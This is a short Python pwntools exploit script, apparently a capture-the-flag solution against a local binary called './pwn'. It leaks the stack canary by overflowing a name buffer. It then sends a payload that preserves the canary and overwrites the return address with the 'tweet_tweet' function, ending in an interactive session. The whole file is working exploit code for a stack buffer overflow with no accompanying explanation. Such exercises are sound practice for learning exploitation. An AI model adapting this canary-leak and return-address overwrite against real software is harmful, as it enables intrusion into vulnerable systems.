#!/bin/python3
from pwn import *

canaryOffset = 0x30 - 0x10
winOffset = 0x6c - 0x5c # $ebp - $(end of canary addr)


def leakCanary():
	p = process('./pwn')

	p.sendline(f"{canaryOffset}".encode())

	p.recvuntil(b'name? \n')
	p.send(b"A"*canaryOffset)

	p.recvuntil(f'name is {"A"*canaryOffset}'.encode())

	canary = p.recv().rstrip()[:8]

	return canary

canary = leakCanary()
log.info(f'Got canary: {canary}')
p = process('./pwn')
e = ELF('./pwn')

payload = b''
payload += b'A'*canaryOffset
payload += canary
payload += b'B'*winOffset
payload += p32(e.sym['tweet_tweet'])

p.sendline(f'{len(payload)}'.encode())
p.sendline(payload)
p.interactive()